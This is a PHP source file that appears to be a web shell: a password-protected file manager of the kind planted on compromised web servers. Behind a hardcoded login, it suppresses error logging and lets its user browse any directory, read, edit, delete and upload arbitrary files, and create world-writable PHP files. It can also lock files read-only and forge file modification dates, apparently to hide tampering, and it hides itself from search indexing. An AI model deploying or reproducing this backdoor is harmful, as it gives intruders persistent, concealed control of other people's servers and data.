<?php
session_start();

// Define username and password
$valid_username = "admin";
$valid_password = "jal888";

// Check if user is logged in
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // $username = $_POST['username'] ?? '';
        // $password = $_POST['password'] ?? '';
        $username = isset($_POST['username']) ? $_POST['username'] : '';
        $password = isset($_POST['password']) ? $_POST['password'] : '';
        if ($username === $valid_username && $password === $valid_password) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Invalid username or password!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-black text-cyan-400">
        <div class="flex items-center justify-center min-h-screen">
            <div class="w-full max-w-md">
                <h2 class="text-3xl font-bold text-center mb-8">Login</h2>
                <?php if (isset($error)) echo "<p class='text-red-500 text-center mb-4'>$error</p>"; ?>
                <form method="POST" class="space-y-4">
                    <div>
                        <input type="text" name="username" placeholder="Username" required 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded focus:outline-none focus:border-pink-600">
                    </div>
                    <div>
                        <input type="password" name="password" placeholder="Password" required 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded focus:outline-none focus:border-pink-600">
                    </div>
                    <button type="submit" 
                        class="w-full bg-pink-500 text-white p-3 rounded hover:bg-pink-600 transition duration-200">
                        Login
                    </button>
                </form>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
    <meta name="robots" content="noindex,nofollow">
    <meta name="googlebot" content="noindex">
    <meta name="description" content="Secure Page">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .copy-icon, .paste-icon {
            cursor: pointer;
            transition: all 0.2s;
        }
        .copy-icon:hover {
            color: #06b6d4;
            transform: scale(1.1);
        }
        .paste-icon:hover {
            color: #ec4899;
            transform: scale(1.1);
        }
        .paste-icon.disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }
        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #10b981;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            z-index: 1000;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
    </style>
    <script>
        let copiedTimestamp = null;
        
        function copyTimestamp(timestamp, filename) {
            copiedTimestamp = timestamp;
            showToast('📋 Date copied from: ' + filename);
            updatePasteButtons();
        }
        
        function pasteTimestamp(targetPath) {
            if (!copiedTimestamp) {
                showToast('❌ No date copied!', 'error');
                return;
            }
            
            // Create form and submit
            const form = document.createElement('form');
            form.method = 'POST';
            form.style.display = 'none';
            
            const actionInput = document.createElement('input');
            actionInput.name = 'paste_timestamp';
            actionInput.value = '1';
            
            const targetInput = document.createElement('input');
            targetInput.name = 'target_path';
            targetInput.value = targetPath;
            
            const timestampInput = document.createElement('input');
            timestampInput.name = 'timestamp';
            timestampInput.value = copiedTimestamp;
            
            form.appendChild(actionInput);
            form.appendChild(targetInput);
            form.appendChild(timestampInput);
            document.body.appendChild(form);
            form.submit();
        }
        
        function updatePasteButtons() {
            const pasteButtons = document.querySelectorAll('.paste-icon');
            pasteButtons.forEach(btn => {
                if (copiedTimestamp) {
                    btn.classList.remove('disabled');
                    btn.title = 'Paste copied date';
                } else {
                    btn.classList.add('disabled');
                    btn.title = 'No date copied';
                }
            });
        }
        
        function showToast(message, type = 'success') {
            const toast = document.createElement('div');
            toast.className = 'toast';
            if (type === 'error') {
                toast.style.background = '#ef4444';
            }
            toast.textContent = message;
            document.body.appendChild(toast);
            
            setTimeout(() => {
                toast.remove();
            }, 3000);
        }
        
        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            updatePasteButtons();
        });
    </script>
</head>
<body class="bg-black text-cyan-400 min-h-screen p-8">
    <div class="max-w-7xl mx-auto">
        <header class="text-center mb-8">
            <h1 class="text-5xl font-bold mb-4 text-cyan-400 drop-shadow-lg">OLD</h1>
            <p><a href="logout.php" class="text-pink-500 hover:text-pink-400">Logout</a></p>
        </header>

        <div class="directory-nav mb-8">
            <?php
            error_reporting(0);
            ob_start();
            set_time_limit(0);
            @ini_set("memory_limit",-1);
            @ini_set('error_log',null);
            @ini_set('html_errors',0);
            @ini_set('log_errors',0);
            @ini_set('log_errors_max_len',0);
            @ini_set('display_errors',0);
            @ini_set('display_startup_errors',0);
            @ini_set('max_execution_time',0);
            @ini_set('magic_quotes_runtime', 0);

            if (isset($_GET['dir'])) {
                $dir = $_GET['dir'];
            } else {
                $dir = getcwd();
            }

            $dir = str_replace("\\", "/", $dir);
            $dirs = explode("/", $dir);

            echo '<div class="text-lg mb-4 flex flex-wrap gap-2">';
            foreach ($dirs as $key => $value) {
                if ($value == "" && $key == 0) {
                    echo '<a href="/" class="text-pink-500 hover:text-pink-400">/</a>';
                    continue;
                }
                echo '<a href="?dir=';
                for ($i=0; $i <= $key ; $i++) { 
                    echo "$dirs[$i]";
                    if ($key !== $i) echo "/";
                }
                echo '" class="text-cyan-400 hover:text-cyan-300">'.$value.'</a>/';
            }
            echo '</div>';
            echo '<div class="mb-4">';
            echo '<a href="?" class="text-pink-500 hover:text-pink-400 mr-4">[Home]</a>';
            echo '</div>';
            ?>
        </div>

        <div class="action-buttons flex flex-wrap gap-4 mb-8">
            <a href="?dir=<?php echo $dir; ?>&wibu=wibufolder" 
                class="px-4 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                Create Folder
            </a>
            <a href="?dir=<?php echo $dir; ?>&wibu=wibufile" 
                class="px-4 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                Create File
            </a>
            <a href="?dir=<?php echo $dir; ?>&wibu=lockfile" 
                class="px-4 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                Lock File
            </a>
            <a href="?dir=<?php echo $dir; ?>&wibu=seocheck" 
                class="px-4 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                SEO
            </a>
            <a href="?wibu_about" 
                class="px-4 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                About us
            </a>
        </div>

        <form enctype="multipart/form-data" method="post" class="mb-8">
            <div class="flex flex-col sm:flex-row gap-4">
                <input type="file" name="upfile" 
                    class="flex-1 p-2 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                <input type="submit" name="up" value="Upload" 
                    class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
            </div>
        </form>

        <?php
        if(isset($_POST['up'])){
            $uploadfile = $_FILES['upfile']['name'];
            if(move_uploaded_file($_FILES['upfile']['tmp_name'],$dir.'/'.$_FILES['upfile']['name'])){
                echo '<div class="bg-green-500 text-white p-4 rounded mb-4">File was successfully uploaded!</div>';
            } else {
                echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Upload failed!</div>';
            }
        }
        ?>

        <div class="overflow-x-auto">
            <table class="w-full border-collapse mb-8">
                <thead>
                    <tr>
                        <th class="border-2 border-pink-500 p-3 text-left">Name</th>
                        <th class="border-2 border-pink-500 p-3 text-left">Size</th>
                        <th class="border-2 border-pink-500 p-3 text-left">Date Modified</th>
                        <th class="border-2 border-pink-500 p-3 text-left">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $scan = scandir($dir);
                    foreach ($scan as $directory) {
                        if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;
                        $full_path = $dir.'/'.$directory;
                        $date_modified = date("m/d/Y, H:i", filemtime($full_path));
                        ?>
                        <tr>
                            <td class="border-2 border-pink-500 p-3">
                                <a href="?dir=<?php echo $full_path; ?>" 
                                    class="text-cyan-400 hover:text-cyan-300">
                                    📁 <?php echo $directory; ?>
                                </a>
                            </td>
                            <td class="border-2 border-pink-500 p-3 text-center">--</td>
                            <td class="border-2 border-pink-500 p-3 text-center">
                                <?php echo $date_modified; ?>
                                <div class="inline-flex ml-2 gap-1">
                                    <span class="copy-icon text-cyan-400" 
                                          onclick="copyTimestamp(<?php echo filemtime($full_path); ?>, '<?php echo $directory; ?>')" 
                                          title="Copy date">📋</span>
                                    <span class="paste-icon text-pink-500 disabled" 
                                          onclick="pasteTimestamp('<?php echo $full_path; ?>')" 
                                          title="Paste date">📅</span>
                                </div>
                            </td>
                            <td class="border-2 border-pink-500 p-3">
                                <div class="flex flex-wrap gap-2">
                                    <a href="?dir=<?php echo $dir; ?>&wibu=editdate&target=<?php echo $full_path; ?>" 
                                        class="px-3 py-1 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                                        ✏️ Edit Date
                                    </a>
                                    <a href="?dir=<?php echo $full_path; ?>&wibu=rename" 
                                        class="px-3 py-1 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                                        📝 Rename
                                    </a>
                                </div>
                            </td>
                        </tr>
                        <?php
                    }

                    foreach ($scan as $file) {
                        if (!is_file($dir.'/'.$file)) continue;

                        $full_path = $dir.'/'.$file;
                        $jumlah = filesize($full_path)/1024;
                        $jumlah = round($jumlah, 3);
                        if ($jumlah >= 1024) {
                            $jumlah = round($jumlah/1024, 2).'MB';
                        } else {
                            $jumlah = $jumlah .'KB';
                        }
                        $date_modified = date("m/d/Y, H:i", filemtime($full_path));
                        ?>
                        <tr>
                            <td class="border-2 border-pink-500 p-3">
                                <a href="?dir=<?php echo $dir; ?>&open=<?php echo $full_path; ?>" 
                                    class="text-cyan-400 hover:text-cyan-300">
                                    📄 <?php echo $file; ?>
                                </a>
                            </td>
                            <td class="border-2 border-pink-500 p-3 text-center"><?php echo $jumlah; ?></td>
                            <td class="border-2 border-pink-500 p-3 text-center">
                                <?php echo $date_modified; ?>
                                <div class="inline-flex ml-2 gap-1">
                                    <span class="copy-icon text-cyan-400" 
                                          onclick="copyTimestamp(<?php echo filemtime($full_path); ?>, '<?php echo $file; ?>')" 
                                          title="Copy date">📋</span>
                                    <span class="paste-icon text-pink-500 disabled" 
                                          onclick="pasteTimestamp('<?php echo $full_path; ?>')" 
                                          title="Paste date">📅</span>
                                </div>
                            </td>
                            <td class="border-2 border-pink-500 p-3">
                                <div class="flex flex-wrap gap-2">
                                    <a href="?dir=<?php echo $dir; ?>&ubah=<?php echo $full_path; ?>" 
                                        class="px-3 py-1 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                                        ✏️ Edit
                                    </a>
                                    <a href="?dir=<?php echo $dir; ?>&delete=<?php echo $full_path; ?>" 
                                        class="px-3 py-1 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                                        🗑️ Delete
                                    </a>
                                    <a href="?dir=<?php echo $dir; ?>&wibu=editdate&target=<?php echo $full_path; ?>" 
                                        class="px-3 py-1 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                                        ✏️ Edit Date
                                    </a>
                                    <a href="?dir=<?php echo $full_path; ?>&wibu=rename" 
                                        class="px-3 py-1 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                                        📝 Rename
                                    </a>
                                </div>
                            </td>
                        </tr>
                        <?php
                    }
                    ?>
                </tbody>
            </table>
        </div>

        <?php
        // Handle paste timestamp action
        if(isset($_POST['paste_timestamp'])) {
            $target_path = $_POST['target_path'];
            $timestamp = $_POST['timestamp'];
            
            if(touch($target_path, $timestamp, $timestamp)) {
                echo '<div class="bg-green-500 text-white p-4 rounded mb-4">✅ Date pasted successfully to: ' . basename($target_path) . '</div>';
            } else {
                echo '<div class="bg-red-500 text-white p-4 rounded mb-4">❌ Failed to paste date!</div>';
            }
        }
        
        if (isset($_GET['open'])) {
            echo '<div class="mb-8">';
            echo '<textarea class="w-full h-96 p-4 bg-black border-2 border-pink-500 text-cyan-400 rounded" readonly>';
            echo htmlspecialchars(file_get_contents($_GET['open']));
            echo '</textarea>';
            echo '</div>';
        }

        if (isset($_GET['delete'])) {
            if (unlink($_GET['delete'])) {
                echo "<script>alert('File deleted successfully');window.location='?dir=".$dir."';</script>";
            }
        }

        if (isset($_GET['ubah'])) {
            echo '<div class="mb-8">';
            echo '<div class="text-pink-500 mb-4">Editing file: '.basename($_GET['ubah']).'</div>';
            echo '<form method="post">';
            echo '<input type="hidden" name="object" value="'.$_GET['ubah'].'">';
            echo '<textarea name="edit" class="w-full h-96 p-4 bg-black border-2 border-pink-500 text-cyan-400 rounded mb-4">';
            echo htmlspecialchars(file_get_contents($_GET['ubah']));
            echo '</textarea>';
            echo '<div class="text-center">';
            echo '<input type="submit" value="Save" class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">';
            echo '</div>';
            echo '</form>';
            echo '</div>';
        }

        if (isset($_POST['edit'])) {
            $data = fopen($_POST["object"], 'w');
            if (fwrite($data, $_POST['edit'])) {
                echo '<div class="bg-green-500 text-white p-4 rounded mb-4">File edited successfully!</div>';
            } else {
                echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to edit file!</div>';
            }
        }

        if(isset($_REQUEST['wibu_about'])) {
            // Add your about content here
            echo '<div class="text-center mb-8">';
            echo '<h2 class="text-2xl mb-4">About Us</h2>';
            echo '<p>Your about content here</p>';
            echo '</div>';
        }

        if($_GET['wibu'] == 'wibufile') {
            ?>
            <div class="mb-8">
                <form method="post" class="space-y-4">
                    <div>
                        <label class="block mb-2">Create File:</label>
                        <input type="text" name="s" value="P4.php" 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                    </div>
                    <div>
                        <textarea name="text" 
                            class="w-full h-64 p-4 bg-black border-2 border-pink-500 text-cyan-400 rounded"></textarea>
                    </div>
                    <div>
                        <input type="submit" name="addfile" value="Create File" 
                            class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
                    </div>
                </form>
            </div>
            <?php
            if (isset($_POST['addfile'])) {
                $mkdir = fopen($_GET['dir'] . '/' . $_POST['s'], 'w');
                fwrite($mkdir, $_POST['text']);
                chmod($mkdir, 0777);
                if (!file_exists($mkdir)) {
                    echo '<div class="bg-green-500 text-white p-4 rounded mb-4">File created successfully!</div>';
                } else {
                    echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to create file!</div>';
                }
                fclose($mkdir);
            }
        }
        
        elseif($_GET['wibu'] == 'wibufolder') {
            ?>
            <div class="mb-8">
                <form method="post" class="space-y-4">
                    <div>
                        <label class="block mb-2">Create Folder:</label>
                        <input type="text" name="okfolder" value="P4_FOLDER" 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                    </div>
                    <div>
                        <input type="submit" name="addfolder" value="Create Folder" 
                            class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
                    </div>
                </form>
            </div>
            <?php
            if(isset($_POST['addfolder'])){
                $okfolder = $_GET['dir'] . '/'. $_POST['okfolder'];
                if(!empty($okfolder)){
                    $fd = mkdir($okfolder, 0777);
                    echo '<div class="bg-green-500 text-white p-4 rounded mb-4">Folder created successfully!</div>';
                } else {
                    echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to create folder!</div>';
                }
            }
        }
        
        elseif($_GET['wibu'] == 'lockfile') {
            ?>
            <div class="mb-8">
                <form method="post" class="space-y-4">
                    <div>
                        <label class="block mb-2">File Name:</label>
                        <input type="text" name="lockedfile" 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                    </div>
                    <div>
                        <input type="submit" name="locked" value="Lock File" 
                            class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
                    </div>
                </form>
            </div>
            <?php
            if(isset($_POST['locked'])){
                $name = $_GET['dir'] . '/'. $_POST['lockedfile'];
                chmod($name, 0444);
                if ($name) {
                    echo '<div class="bg-green-500 text-white p-4 rounded mb-4">File locked successfully: ' . $name . '</div>';
                } else {
                    echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to lock file!</div>';
                }
            }
        }
        
        elseif($_GET['wibu'] == 'seocheck') {
            echo '<div class="mb-8">';
            echo '<iframe id="content" name="content" class="w-full h-96 border-2 border-pink-500 rounded" src="https://www.google.com/search?igu=1&ei=&q=site%3A'.$_SERVER['HTTP_HOST'].'"></iframe>';
            echo '</div>';
        }
        
        elseif($_GET['wibu'] == 'editdate') {
            $target = $_GET['target'];
            $current_timestamp = filemtime($target);
            $current_date = date("Y-m-d", $current_timestamp);
            $current_time = date("H:i", $current_timestamp);
            ?>
            <div class="mb-8">
                <div class="text-pink-500 mb-4">Edit Date/Time for: <?php echo basename($target); ?></div>
                <form method="post" class="space-y-4">
                    <input type="hidden" name="target_file" value="<?php echo $target; ?>">
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                            <label class="block mb-2">Date:</label>
                            <input type="date" name="new_date" value="<?php echo $current_date; ?>" 
                                class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                        </div>
                        <div>
                            <label class="block mb-2">Time:</label>
                            <input type="time" name="new_time" value="<?php echo $current_time; ?>" 
                                class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                        </div>
                    </div>
                    <div class="text-center">
                        <input type="submit" name="update_date" value="Update Date/Time" 
                            class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
                        <a href="?dir=<?php echo dirname($target); ?>" 
                            class="ml-4 px-6 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                            Cancel
                        </a>
                    </div>
                </form>
            </div>
            <?php
            if(isset($_POST['update_date'])) {
                $target_file = $_POST['target_file'];
                $new_date = $_POST['new_date'];
                $new_time = $_POST['new_time'];
                
                // Combine date and time
                $new_datetime = $new_date . ' ' . $new_time;
                $new_timestamp = strtotime($new_datetime);
                
                if($new_timestamp !== false) {
                    // Update both access time and modification time
                    if(touch($target_file, $new_timestamp, $new_timestamp)) {
                        echo '<div class="bg-green-500 text-white p-4 rounded mb-4">Date/Time updated successfully!</div>';
                        echo '<script>setTimeout(function(){ window.location="?dir=' . dirname($target_file) . '"; }, 1500);</script>';
                    } else {
                        echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to update date/time!</div>';
                    }
                } else {
                    echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Invalid date/time format!</div>';
                }
            }
        }
        
        elseif($_GET['wibu'] == 'rename') {
            ?>
            <div class="mb-8">
                <form method="post" class="space-y-4">
                    <div>
                        <label class="block mb-2">Rename to:</label>
                        <input type="text" name="fol_rename" value="<?php echo basename($dir); ?>" 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                    </div>
                    <div>
                        <input type="submit" name="dir_rename" value="Rename" 
                            class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
                    </div>
                </form>
            </div>
            <?php
            if(isset($_POST['dir_rename'])) {
                $dir_rename = rename($dir, dirname($dir)."/".htmlspecialchars($_POST['fol_rename']));
                if($dir_rename) {
                    echo '<div class="bg-green-500 text-white p-4 rounded mb-4">Renamed successfully!</div>';
                } else {
                    echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to rename!</div>';
                }
            }
        }
        ?>

        <footer class="text-center mt-8 border-t-2 border-pink-500 pt-4">
            <p>© 2023 OLD. <a href="?die" class="text-pink-500 hover:text-pink-400">Log Out</a></p>
            <hr class="w-3/5 mx-auto border-pink-500 my-4">
        </footer>
    </div>
</body>
</html>

<?php
// Logout script
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>